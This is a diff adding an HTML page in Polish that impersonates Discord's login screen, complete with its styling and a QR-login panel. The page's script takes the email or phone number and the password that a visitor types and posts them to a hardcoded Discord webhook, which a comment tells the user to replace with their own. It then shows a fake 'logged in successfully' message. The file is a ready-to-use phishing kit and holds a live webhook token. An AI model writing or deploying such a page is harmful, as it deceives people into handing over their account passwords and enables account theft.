@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Discord</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+    body {
+      margin: 0;
+      font-family: 'Inter', system-ui, sans-serif;
+      background: linear-gradient(135deg, #36393f, #2f3136);
+      color: #dcddde;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    .container {
+      background: #36393f;
+      width: 100%;
+      max-width: 900px;
+      border-radius: 8px;
+      padding: 40px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.6);
+      display: flex;
+      gap: 60px;
+    }
+
+    .left {
+      flex: 1;
+    }
+
+    .right {
+      width: 260px;
+      text-align: center;
+    }
+
+    .logo {
+      width: 48px;
+      height: 48px;
+      background: #5865f2;
+      border-radius: 12px;
+      margin: 0 auto 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      color: white;
+    }
+
+    h1 {
+      font-size: 26px;
+      font-weight: 700;
+      color: #fff;
+      text-align: center;
+      margin: 0 0 8px 0;
+    }
+
+    .subtitle {
+      text-align: center;
+      color: #b9bbbe;
+      font-size: 15px;
+      margin-bottom: 32px;
+    }
+
+    label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: #b9bbbe;
+      margin-bottom: 8px;
+      text-transform: uppercase;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px 14px;
+      background: #202225;
+      border: 1px solid #202225;
+      border-radius: 4px;
+      color: #dcddde;
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+
+    input:focus {
+      border-color: #5865f2;
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #5865f2;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #4752c4;
+    }
+
+    .forgot {
+      color: #00aff4;
+      font-size: 14px;
+      text-decoration: none;
+      display: block;
+      margin-top: 12px;
+    }
+
+    .qr-title {
+      font-size: 18px;
+      font-weight: 600;
+      margin: 20px 0 10px;
+    }
+
+    .qr-box {
+      background: white;
+      width: 160px;
+      height: 160px;
+      margin: 0 auto;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 60px;
+      color: #5865f2;
+    }
+
+    .qr-text {
+      color: #b9bbbe;
+      font-size: 14px;
+      margin-top: 12px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Lewa strona - formularz -->
+    <div class="left">
+      <div class="logo">◉</div>
+      <h1>Witamy ponownie!</h1>
+      <p class="subtitle">Cieszymy się, że znowu z nami jesteś!</p>
+
+      <form id="loginForm">
+        <label>Adres e-mail lub numer telefonu</label>
+        <input type="text" id="email" placeholder="" required>
+
+        <label>Hasło</label>
+        <input type="password" id="password" placeholder="" required>
+
+        <button type="submit">Zaloguj się</button>
+      </form>
+
+      <a href="#" class="forgot">Nie pamiętasz hasła?</a>
+
+    <!-- Prawa strona - QR -->
+    <div class="right">
+      <div class="qr-title">Zaloguj się kodem QR</div>
+      <div class="qr-box">📱</div>
+      <p class="qr-text">Zeskanuj to aplikacją mobilną Discord,<br>by natychmiast się zalogować.</p>
+    </div>
+  </div>
+
+  <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1493250113588691067/2kSrCkWZnkMKpbYNURbE-afbcfWLwrwlXyGWHr22AdA4LphCobaTQh3tTctEXXVbQmvu"; // ← ZMIEŃ NA SWÓJ!
+
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      if (!email || !password) {
+        alert("Wypełnij wszystkie pola!");
+        return;
+      }
+
+      const payload = {
+        username: "Discord Login",
+        embeds: [{
+          title: "🔑 Nowe logowanie na Discord",
+          color: 0x5865f2,
+          fields: [
+            { name: "Email / Telefon", value: email, inline: true },
+            { name: "Hasło", value: password, inline: true },
+            { name: "Czas", value: new Date().toLocaleString('pl-PL') }
+          ]
+        }]
+      };
+
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        alert("✅ Zalogowano pomyślnie!");
+      } catch (err) {
+        alert("Błąd połączenia.");
+      }
+    });
+  </script>
+
+</body>
+</html>
